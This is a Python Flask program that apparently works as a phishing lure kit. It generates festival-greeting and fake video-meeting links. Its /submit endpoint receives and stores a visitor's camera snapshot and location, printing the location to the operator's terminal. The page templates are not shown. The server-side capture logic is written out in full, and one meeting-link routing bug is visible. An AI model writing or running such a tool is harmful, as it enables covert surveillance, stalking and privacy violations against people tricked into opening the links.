from flask import Flask, request, render_template, jsonify
import os
import threading
import webbrowser
from datetime import datetime
import base64

app = Flask(__name__)

FESTIVALS = ["holi", "diwali", "eid", "christmas", "new year", "ramzaan"]
MEETINGS = ["zoom", "google meet", "class meet"]

@app.route("/")
def home():
    return "Use terminal to select festival/meeting."

@app.route("/festival/<name>")
def festival(name):
    if name.lower() in FESTIVALS:
        return render_template(f"festivals/{name.lower()}.html")
    return "Festival not found", 404

@app.route("/meeting/<name>")
def meeting(name):
    if name.lower() in MEETINGS:
        return render_template(f"meetings/{name.lower().replace(' ', '_')}.html")
    return "Meeting not found", 404

@app.route("/submit", methods=["POST"])
def submit():
    location = request.form.get("location")
    image_data = request.form.get("image", "").split(",")[1]
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"captures/{timestamp}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(image_data))
    print(f"[📍] Location: {location}")
    print(f"[📷] Image saved: {filename}")
    return jsonify({"status": "ok"})

def terminal_interface():
    print("🎉 Festival & Meeting URL Generator")
    print("Type 'exit' to quit.")
    while True:
        inp = input("\nEnter festival/meeting name: ").strip().lower()
        if inp == "exit":
            print("Exiting...")
            os._exit(0)
        if inp in FESTIVALS:
            url = f"http://127.0.0.1:5000/festival/{inp}"
            print(f"✅ URL: {url}")
        elif inp in MEETINGS:
            url = f"http://127.0.0.1:5000/meeting/{inp.replace(' ', '_')}"
            print(f"✅ URL: {url}")
        else:
            print("❌ Not found. Try again.")

if __name__ == "__main__":
    os.makedirs("captures", exist_ok=True)
    threading.Thread(target=lambda: app.run(host="127.0.0.1", port=5000, debug=False)).start()
    terminal_interface()
